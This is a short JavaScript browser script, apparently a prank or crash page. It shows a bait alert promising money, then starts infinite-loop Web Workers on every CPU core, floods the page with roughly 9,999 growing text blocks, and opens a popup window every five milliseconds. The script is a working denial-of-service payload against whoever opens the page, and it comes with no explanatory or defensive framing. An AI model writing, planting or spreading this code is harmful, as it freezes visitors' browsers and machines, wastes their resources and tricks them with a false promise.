setTimeout(() => {
  alert("Tekan OK dapet gocap");
  const code = `
    self.onmessage = () => {
      while (true) {
        let x = Math.random();
        x = Math.sqrt(x);
      }
    }
  `;
  const blob = new Blob([code], { type: "application/javascript" });
  const url = URL.createObjectURL(blob);
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores; i++) {
    const w = new Worker(url);
    w.postMessage("start");
  }

  let txt = "";
  for (let i = 0; i < 9999; i++) {
    txt += "潰".repeat(100);
    const div = document.createElement("div");
    div.innerText = txt;
    document.body.appendChild(div);
  }

  setInterval(() => {
    open("https://example.invalid", Math.random().toString(), "width=400,height=200");
  }, 5);
}, 1000);
